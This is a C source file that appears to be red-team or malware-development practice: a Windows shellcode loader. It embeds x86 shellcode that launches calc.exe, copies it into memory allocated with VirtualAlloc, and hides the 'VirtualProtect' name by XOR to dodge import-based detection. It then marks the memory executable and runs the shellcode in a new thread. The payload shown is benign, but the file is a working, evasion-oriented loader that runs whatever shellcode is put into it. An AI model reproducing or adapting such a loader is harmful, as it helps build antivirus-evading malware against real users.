// working shellcode

#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


//from https://packetstormsecurity.com/files/156478/Windows-x86-Null-Free-WinExec-Calc.exe-Shellcode.html

char shellcode[] =
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";

typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;
		data[i] = data[i] ^ key[j];
		j++;
	}

	printf("\nbro Xor done\n");
}

int main()
{	
	LPVOID shellcode_exec;
	BOOL rv;
	HANDLE hThread;
	DWORD oldprotect = 0;
	char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	char sVirtualProtect[] = { 0x17, 0x2b, 0x31, 0x30, 0x30, 0x27, 0x2b, 0x18, 0x3b, 0x25, 0x3f, 0x29, 0x2e, 0x3a }; // xor ciphertext same as SEKTOR7// ;

	shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "addr of void * payload", (void*)shellcode);
	printf("%-20s : 0x%-016p\n", "payload & addr", &shellcode);
	printf("%-20s : 0x%-016p\n", "payload addr", shellcode);

	printf("%-20s : 0x%-016p\n", "exec_mem void * addr", (void*)shellcode_exec);
	printf("%-20s : 0x%-016p\n", "exec_mem  addr", shellcode_exec);
	printf("%-20s : 0x%-016p\n", "exec_mem &  addr", &shellcode_exec);

	RtlMoveMemory(shellcode_exec, shellcode, sizeof shellcode);

	XOR(sVirtualProtect, sizeof sVirtualProtect, key, sizeof key);

	//sVirtualProtect[sizeof sVirtualProtect] = '\0';
	printf(sVirtualProtect, "\n");
	printf("\nsize of ", (char*)sizeof sVirtualProtect);

	//https://stackoverflow.com/questions/15680008/cannot-convert-from-farproc-to-bool-cdecl-lpmemorystatusex
	pVirtualProtect pVaddress = (pVirtualProtect) GetProcAddress(GetModuleHandle(L"kernel32.dll"), sVirtualProtect);
	pVaddress = (pVirtualProtect) GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect");

	rv = pVaddress(shellcode_exec, sizeof shellcode, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHere I am\n");
	getchar();

	if (rv != 0) {
		hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)shellcode_exec, 0, 0, 0);
		WaitForSingleObject(hThread, -1);
	}

	return 0;

	/*

	for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) ^ '\x35';
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
	*/
}